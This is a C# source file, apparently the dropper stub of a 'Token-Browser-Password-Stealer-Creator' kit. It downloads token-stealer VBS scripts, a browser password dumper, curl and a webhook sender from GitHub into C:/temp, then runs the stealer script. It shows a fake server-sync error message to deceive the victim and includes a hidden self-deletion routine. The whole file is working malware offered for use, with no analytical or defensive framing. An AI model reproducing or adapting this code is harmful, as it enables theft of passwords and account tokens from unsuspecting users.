using System;
using System.IO;
using System.Windows.Forms;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.ComponentModel;
using System.Threading;

public class download
{
    public static void Main()
    {
        {
            string _pwTemp = @"C:/temp";
            DirectoryInfo di = Directory.CreateDirectory(_pwTemp);
            using (WebClient webClient = new WebClient())
                webClient.DownloadFile("finalresbatch", @"C:/temp/finalres.bat");
            using (WebClient webClient = new WebClient())
                webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/tokenstealer.vbs", @"C:/temp/finalres.vbs");
            using (WebClient webClient = new WebClient())
                webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/tokenstealer2.vbs", @"C:/temp/finalres2.vbs");
            using (WebClient webClient = new WebClient())
                webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/WebBrowserPassView.exe?raw=true", @"C:/temp/WebBrowserPassView.exe");
            using (WebClient webClient = new WebClient())
                webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/curl-ca-bundle.crt", @"C:/temp/curl-ca-bundle.crt");
            using (WebClient webClient = new WebClient())
                webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/curl.exe?raw=true", @"C:/temp/curl.exe");
            using (WebClient webClient = new WebClient())
                webClient.DownloadFile("sendhookfile", @"C:/temp/filed.exe");
            /*using (WebClient webClient = new WebClient())
                webClient.DownloadFile("customexelink", @"C:/temp/CustomEXE.exe");*/			
        }
        if (File.Exists(@"C:/temp/finalres.vbs"))
        {
            Process run_bat = new Process();
            run_bat.EnableRaisingEvents = false;
            run_bat.StartInfo.FileName = @"C:/temp/finalres.vbs";
            run_bat.Start();
			Thread.Sleep(3000);
			//MessageBox.Show("Your Desc","Your Title");
            //RemoveEXE();
        }
        else
        {
            MessageBox.Show("An error occured while syncing to our servers. Please try again later!");
        }
    }
    public static void RemoveEXE()
    {
        Process.Start(new ProcessStartInfo()
        {
            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            FileName = "cmd.exe"
        });
    }
}